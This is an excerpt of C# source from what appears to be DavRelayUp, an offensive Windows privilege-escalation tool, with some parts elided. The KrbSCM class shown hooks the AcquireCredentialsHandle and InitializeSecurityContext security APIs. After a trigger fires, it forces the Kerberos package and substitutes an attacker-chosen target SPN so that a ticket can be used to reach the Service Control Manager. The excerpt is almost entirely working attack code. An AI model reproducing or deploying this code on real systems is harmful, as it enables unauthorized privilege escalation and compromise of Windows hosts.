...
namespace DavRelayUp
{
    ...
    class KrbSCM
    {
        ...
        [STAThread]
        public static int AcquireCredentialsHandleHook(IntPtr pszPrincipal, IntPtr pszPackage, int fCredentialUse, IntPtr PAuthenticationID, IntPtr pAuthData, IntPtr pGetKeyFn, IntPtr pvGetKeyArgument, ref SECURITY_HANDLE phCredential, IntPtr ptsExpiry)
        {
            if (Options.triggerDone)
            {
                Console.WriteLine($"[+] AcquireCredentialsHandleHook called for package {Marshal.PtrToStringAuto(pszPackage)}");
                Console.WriteLine("[+] Changing to Kerberos package");
                pszPackage = Marshal.StringToHGlobalAuto("Kerberos");
            }
            return AcquireCredentialsHandle(pszPrincipal, pszPackage, fCredentialUse, PAuthenticationID, pAuthData, pGetKeyFn, pvGetKeyArgument, ref phCredential, ptsExpiry);
        }

        [STAThread]
        public static unsafe int InitializeSecurityContextHook(ref SECURITY_HANDLE phCredential, ref SECURITY_HANDLE phContext, IntPtr pszTargetName, int fContextReq, int Reserved1, int TargetDataRep, ref SecBufferDesc pInput, int Reserved2, out SECURITY_HANDLE phNewContext, out SecBufferDesc pOutput, out int pfContextAttr, out SECURITY_HANDLE ptsExpiry)
        {
            int status;
            if (Options.triggerDone)
            {
                Console.WriteLine($"[+] InitializeSecurityContextHook called for target {Marshal.PtrToStringAuto(pszTargetName)}");
                Console.WriteLine($"[+] Changing to {Options.targetSPN}");
                status = InitializeSecurityContext(ref phCredential, ref phContext, Marshal.StringToHGlobalAuto(Options.targetSPN), fContextReq, Reserved1, TargetDataRep, ref pInput, Reserved2, out phNewContext, out pOutput, out pfContextAttr, out ptsExpiry);
                Console.WriteLine($"[+] InitializeSecurityContext status = 0x{status:X8}");
            } else
            {
                return InitializeSecurityContext(ref phCredential, ref phContext, pszTargetName, fContextReq, Reserved1, TargetDataRep, ref pInput, Reserved2, out phNewContext, out pOutput, out pfContextAttr, out ptsExpiry);
            }
            return status;
        }

        public static void HookSecurityContext()
        {
        ...
        {
            // Hook AcquireCredentialsHandle and InitializeSecurityContext to force the usage of Kerberos
            HookSecurityContext();

            Console.WriteLine("[+] Using Kerberos ticket to connect to Service Manger");
        ...
        [DllImport("secur32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int AcquireCredentialsHandle(IntPtr pszPrincipal, IntPtr pszPackage, int fCredentialUse, IntPtr PAuthenticationID, IntPtr pAuthData, IntPtr pGetKeyFn, IntPtr pvGetKeyArgument, ref SECURITY_HANDLE phCredential, IntPtr ptsExpiry);

        [DllImport("secur32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int InitializeSecurityContext(ref SECURITY_HANDLE phCredential, ref SECURITY_HANDLE phContext, IntPtr pszTargetName, int fContextReq, int Reserved1, int TargetDataRep, ref SecBufferDesc pInput, int Reserved2, out SECURITY_HANDLE phNewContext, out SecBufferDesc pOutput, out int pfContextAttr, out SECURITY_HANDLE ptsExpiry);
        ...
        public delegate int FuncAcquireCredentialsHandle(IntPtr pszPrincipal, IntPtr pszPackage, int fCredentialUse, IntPtr PAuthenticationID, IntPtr pAuthData, IntPtr pGetKeyFn, IntPtr pvGetKeyArgument, ref SECURITY_HANDLE phCredential, IntPtr ptsExpiry);
        public delegate int FuncInitializeSecurityContext(ref SECURITY_HANDLE phCredential, ref SECURITY_HANDLE phContext, IntPtr pszTargetName, int fContextReq, int Reserved1, int TargetDataRep, ref SecBufferDesc pInput, int Reserved2, out SECURITY_HANDLE phNewContext, out SecBufferDesc pOutput, out int pfContextAttr, out SECURITY_HANDLE ptsExpiry);
